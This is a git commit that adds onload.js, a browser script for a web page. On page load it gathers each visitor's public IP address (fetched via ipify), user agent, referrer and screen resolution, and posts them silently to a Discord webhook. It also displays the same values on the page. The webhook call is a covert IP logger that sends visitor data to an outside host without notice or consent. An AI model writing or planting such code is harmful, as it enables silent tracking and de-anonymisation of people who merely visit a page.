0fb982d562cd71b48e6a1dfe5b4f6d986fe65ce4
Minoa <57844837+M1noa@users.noreply.github.com>
2023-04-06 19:58:46 -0500

    Create onload.js

---
+++ onload.js
@@ -0,0 +1,55 @@
+      const webhookUrl = "https://discord.com/api/webhooks/";
+
+      document.addEventListener("DOMContentLoaded", function() {
+        const message = {
+          embeds: [
+            {
+              title: "Visitor Information",
+              color: 0xff0000,
+              fields: [
+                {
+                  name: "User Agent",
+                  value: navigator.userAgent,
+                  inline: false
+                },
+                {
+                  name: "Referrer",
+                  value: document.referrer,
+                  inline: false
+                },
+                {
+                  name: "Screen Resolution",
+                  value: screen.width + "x" + screen.height,
+                  inline: false
+                },
+                {
+                  name: "IP Address",
+                  value: "",
+                  inline: false
+                }
+              ]
+            }
+          ]
+        };
+        fetch("https://api.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            message.embeds[0].fields[3].value = data.ip;
+            fetch(webhookUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(message)
+            });
+          });
+      });
+      
+      document.getElementById("user-agent").textContent = navigator.userAgent;
+      document.getElementById("referrer").textContent = document.referrer;
+      document.getElementById("screen-resolution").textContent = screen.width + "x" + screen.height;
+      fetch("https://api.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById("ip-address").textContent = data.ip;
+          });
